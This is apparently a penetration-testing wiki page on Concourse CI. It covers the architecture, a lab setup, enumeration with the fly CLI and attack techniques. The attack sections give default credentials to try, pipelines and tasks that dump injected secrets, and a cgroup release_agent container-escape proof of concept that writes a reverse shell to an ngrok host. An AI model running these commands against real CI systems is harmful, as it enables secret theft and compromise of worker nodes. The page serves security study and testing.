# Concourse

**Concourse allows you to build pipelines to automatically run tests, actions and build images whenever you need it (time based, when something happens...)**

## Architecture

![](<../.gitbook/assets/image (651).png>)

### ATC: web UI & build scheduler

The ATC is the heart of Concourse. It runs the **web UI and API** and is responsible for all pipeline **scheduling**. It **connects to PostgreSQL**, which it uses to store pipeline data (including build logs).

The [checker](https://concourse-ci.org/checker.html)'s responsibility is to continously checks for new versions of resources. The [scheduler](https://concourse-ci.org/scheduler.html) is responsible for scheduling builds for a job and the [build tracker](https://concourse-ci.org/build-tracker.html) is responsible for running any scheduled builds. The [garbage collector](https://concourse-ci.org/garbage-collector.html) is the cleanup mechanism for removing any unused or outdated objects, such as containers and volumes.

### TSA: worker registration & forwarding

The TSA is a **custom-built SSH server** that is used solely for securely **registering** [**workers**](https://concourse-ci.org/internals.html#architecture-worker) with the [ATC](https://concourse-ci.org/internals.html#component-atc).

The TSA by **default listens on port `2222`**, and is usually colocated with the [ATC](https://concourse-ci.org/internals.html#component-atc) and sitting behind a load balancer.

The **TSA implements CLI over the SSH connection,** supporting [**these commands**](https://concourse-ci.org/internals.html#component-tsa).

### Workers

In order to execute tasks concourse must have some workers. These workers **register themselves** via the [TSA](https://concourse-ci.org/internals.html#component-tsa) and run the services [**Garden**](https://github.com/cloudfoundry-incubator/garden) and [**Baggageclaim**](https://github.com/concourse/baggageclaim).

* **Garden**: This is the **Container Manage AP**I, usually run in **port 7777** via **HTTP**.
* **Baggageclaim**: This is the **Volume Management API**, usually run in **port 7788** via **HTTP**.

## Testing Environment

### Running Concourse

#### With Docker-Compose

This docker-compose file simplifies the installation to do some tests with concourse:

```bash
wget https://raw.githubusercontent.com/starkandwayne/concourse-tutorial/master/docker-compose.yml
docker-compose up -d
```

You can download the command line `fly` for your OS from the web in `127.0.0.1:8080`

#### With Kubernetes (Recommended)

You can easily deploy concourse in **Kubernetes** (in **minikube** for example) using the helm-chart: [**concourse-chart**](https://github.com/concourse/concourse-chart).

```bash
brew install helm
helm repo add concourse https://concourse-charts.storage.googleapis.com/
helm install concourse-release concourse/concourse
# concourse-release will be the prefix name for the concourse elements in k8s
# After installing you will find the indications to connect to it in the console

# If you need to delete it
helm delete my-release
```

After generating the concourse env, you could generate a secret and give a access to the SA running in concourse web to access K8s secrets:

```yaml
echo 'apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: read-secrets
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get"]

---

apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-secrets-concourse
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: read-secrets
subjects:
- kind: ServiceAccount
  name: concourse-release-web
  namespace: default
  
---

apiVersion: v1
kind: Secret
metadata:
  name: super
  namespace: concourse-release-main
type: Opaque
data:
  secret: MWYyZDFlMmU2N2Rm

' | kubectl apply -f -
```

### Create Pipeline

A pipeline is made of a list of [Jobs](https://concourse-ci.org/jobs.html) which contains an ordered list of [Steps](https://concourse-ci.org/steps.html).

### Steps

Several different type of steps can be used:

* **the** [**`task` step**](https://concourse-ci.org/task-step.html) **runs a** [**task**](https://concourse-ci.org/tasks.html)****
* the [`get` step](https://concourse-ci.org/get-step.html) fetches a [resource](https://concourse-ci.org/resources.html)
* the [`put` step](https://concourse-ci.org/put-step.html) updates a [resource](https://concourse-ci.org/resources.html)
* the [`set_pipeline` step](https://concourse-ci.org/set-pipeline-step.html) configures a [pipeline](https://concourse-ci.org/pipelines.html)
* the [`load_var` step](https://concourse-ci.org/load-var-step.html) loads a value into a [local var](https://concourse-ci.org/vars.html#local-vars)
* the [`in_parallel` step](https://concourse-ci.org/in-parallel-step.html) runs steps in parallel
* the [`do` step](https://concourse-ci.org/do-step.html) runs steps in sequence
* the [`across` step modifier](https://concourse-ci.org/across-step.html#schema.across) runs a step multiple times; once for each combination of variable values
* the [`try` step](https://concourse-ci.org/try-step.html) attempts to run a step and succeeds even if the step fails

Each [step](https://concourse-ci.org/steps.html) in a [job plan](https://concourse-ci.org/jobs.html#schema.job.plan) runs in its **own container**. You can run anything you want inside the container _(i.e. run my tests, run this bash script, build this image, etc.)_. So if you have a job with five steps Concourse will create five containers, one for each step.

Therefore, it's possible to indicate the type of container each step needs to be run in.



### Simple Pipeline Example

```yaml
jobs:
- name: simple
  plan:
  - task: simple-task
    privileged: true
    config:
      # Tells Concourse which type of worker this task should run on
      platform: linux
      image_resource:
        type: registry-image
        source:
          repository: busybox # images are pulled from docker hub by default
      run:
        path: sh
        args:
        - -cx
        - |
          sleep 1000
          echo "$SUPER_SECRET"
      params:
        SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial set-pipeline -p pipe-name -c hello-world.yml
# pipelines are paused when first created
fly -t tutorial unpause-pipeline -p pipe-name
# trigger the job and watch it run to completion
fly -t tutorial trigger-job --job pipe-name/simple --watch
# From another console
fly -t tutorial intercept --job pipe-name/simple
```

### Bash script with output/input pipeline

It's possible to **save the results of one task in a file** and indicate that it's an output and then indicate the input of the next task as the output of the previous task. What concourse does is to **mount the directory of the previous task in the new task where you can access the files created by the previous task**.

### Triggers

You don't need to trigger the jobs manually every-time you need to run them, you can also program  them to be run every-time:

* Some time passes: [Time resource](https://github.com/concourse/time-resource/)
* On new commits to the main branch: [Git resource](https://github.com/concourse/git-resource)
* New PR's: [Github-PR resource](https://github.com/telia-oss/github-pr-resource)
* Fetch or push the latest image of your app: [Registry-image resource](https://github.com/concourse/registry-image-resource/)

Check a YAML pipeline example that triggers on new commits to master in [https://concourse-ci.org/tutorial-resources.html](https://concourse-ci.org/tutorial-resources.html)

## User Roles & Permissions

Concourse comes with five roles:

* _Concourse_ **Admin**: This role is only given to owners of the **main team** (default initial concourse team). Admins can **configure other teams** (e.g.: `fly set-team`, `fly destroy-team`...). The permissions of this role cannot be affected by RBAC.
* **owner**: Team owners can **modify everything within the team**.
* **member**: Team members can **read and write** within the **teams assets** but cannot modify the team settings.
* **pipeline-operator**: Pipeline operators can perform **pipeline operations** such as triggering builds and pinning resources, however they cannot update pipeline configurations.
* **viewer**: Team viewers have **"read-only" access to a team** and its pipelines.

{% hint style="info" %}
Moreover, the **permissions of the roles owner, member, pipeline-operator and viewer can be modified** configuring RBAC (configuring more specifically it's actions). Read more about it in: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Note that Concourse **groups pipelines inside Teams**. Therefore users belonging to a Team will be able to manage those pipelines and **several Teams** might exist. A user can belong to several Teams and have different permissions inside each of them.

## Vars & Credential Manager

In the YAML configs you can configure values using the syntax `((`_`source-name`_`:`_`secret-path`_`.`_`secret-field`_`))`.\
The **source-name is optional**, and if omitted, the [cluster-wide credential manager](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) will be used, or the value may be provided [statically](https://concourse-ci.org/vars.html#static-vars).\
The **optional **_**secret-field**_ specifies a field on the fetched secret to read. If omitted, the credential manager may choose to read a 'default field' from the fetched credential if the field exists.\
Moreover, the _**secret-path**_ and _**secret-field**_ may be surrounded by double quotes `"..."` if they **contain special characters** like `.` and `:`. For instance, `((source:"my.secret"."field:1"))` will set the _secret-path_ to `my.secret` and the _secret-field_ to `field:1`.

### Static Vars

Static vars can be specified in **tasks steps**:

```yaml
  - task: unit-1.13
    file: booklit/ci/unit.yml
    vars: {tag: 1.13}
```

Or using the following `fly` **arguments**:

* `-v` or `--var` `NAME=VALUE` sets the string `VALUE` as the value for the var `NAME`.
* `-y` or `--yaml-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the var `NAME`.
* `-i` or `--instance-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the instance var `NAME`. See [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) to learn more about instance vars.
* `-l` or `--load-vars-from` `FILE` loads `FILE`, a YAML document containing mapping var names to values, and sets them all.

### Credential Management

There are different ways a **Credential Manager can be specified** in a pipeline, read how in [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Moreover, Concourse supports different credential managers:

* [The Vault credential manager](https://concourse-ci.org/vault-credential-manager.html)
* [The CredHub credential manager](https://concourse-ci.org/credhub-credential-manager.html)
* [The AWS SSM credential manager](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [The AWS Secrets Manager credential manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
* [The Conjur credential manager](https://concourse-ci.org/conjur-credential-manager.html)
* [Caching credentials](https://concourse-ci.org/creds-caching.html)
* [Redacting credentials](https://concourse-ci.org/creds-redacting.html)
* [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Note that if you have some kind of **write access to Concourse** you can create jobs to **exfiltrate those secrets** as Concourse needs to be able to access them.
{% endhint %}

## Concourse Enumeration

In order to enumerate a concourse environment you first need to **gather valid credentials** or to find an **authenticated token** probably in a `.flyrc` config file.

### Login and Current User enum

* To login you need to know the **endpoint**, the **team name** (default is `main`) and a **team the user belongs to**:
  * `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Get configured **targets**:
  * `fly targets`
* Get if the configured **target connection** is still **valid**:
  * `fly -t <target> status`
* Get **role** of the user against the indicated target:
  * `fly -t <target> userinfo`

### Teams & Users

* Get a list of the Teams
  * `fly -t <target> teams`
* Get roles inside team
  * `fly -t <target> get-team -n <team-name>`
* Get a list of users
  * `fly -t <target> active-users`

### Pipelines

* **List** pipelines:
  * `fly -t <target> pipelines -a`
* **Get** pipeline yaml (**sensitive information** might be found in the definition):
  * `fly -t <target> get-pipeline -p <pipeline-name>`
* Get all pipeline **config declared vars**
  * `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Get all the **pipelines secret names used** (if you can create/modify a job or hijack a container you could exfiltrate them):

```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do 
    echo $pipename;
    fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
    echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```

### Containers & Workers

* List **workers**:
  * `fly -t <target> workers`
* List **containers**:
  * `fly -t <target> containers`

## Concourse Attacks

### Credentials Brute-Force

* admin:admin
* test:test

### Session inside running or recently run container

If you have enough privileges (**member role or more**) you will be able to **list pipelines and roles** and just get a **session inside** the `<pipeline>/<job>` **container** using:

```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```

With these permissions you might be able to:

* **Steal the secrets** inside the **container**
* Try to **escape** to the node
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node, if possible)

### Pipeline Creation/Modification

If you have enough privileges (**member role or more**) you will be able to **create/modify new pipelines.** Check this example:

```yaml
jobs:
- name: simple
  plan:
  - task: simple-task
    privileged: true
    config:
      # Tells Concourse which type of worker this task should run on
      platform: linux
      image_resource:
        type: registry-image
        source:
          repository: busybox # images are pulled from docker hub by default
      run:
        path: sh
        args:
        - -cx
        - |
          echo "$SUPER_SECRET"
          sleep 1000
      params:
        SUPER_SECRET: ((super.secret))
```

With the **modification/creation** of a new pipeline you will be able to:

* **Steal** the **secrets** (via echoing them out or getting inside the container and running `env`)
* **Escape** to the **node** (by giving you enough privileges - `privileged: true`)
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node)
* **Delete** created pipeline

### Execute Custom Task

This is similar to the previous method but instead of modifying/creating a whole new pipeline you can **just execute a custom task** (which will probably be much more **stealthier**):

```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
  type: registry-image
  source:
    repository: ubuntu
run:
  path: sh
  args:
  - -cx
  - |
    env
    sleep 1000
params:
  SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

### Escaping to the node

In the previous sections we saw how to **execute a privileged task with concourse**. This won't give the container exactly the same access as the privileged flag in a docker container. For example, you won't see the node filesystem device in /dev, so the escape could be more "complex".

In the following PoC we are going to use the release\_agent to escape with some small modifications:

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

{% hint style="warning" %}
As you might have noticed this is just a [**regular release\_agent escape**](../linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation.md#privileged) just modifying the path of the cmd in the node
{% endhint %}

## References

* [https://concourse-ci.org/internals.html#architecture-worker](https://concourse-ci.org/internals.html#architecture-worker)
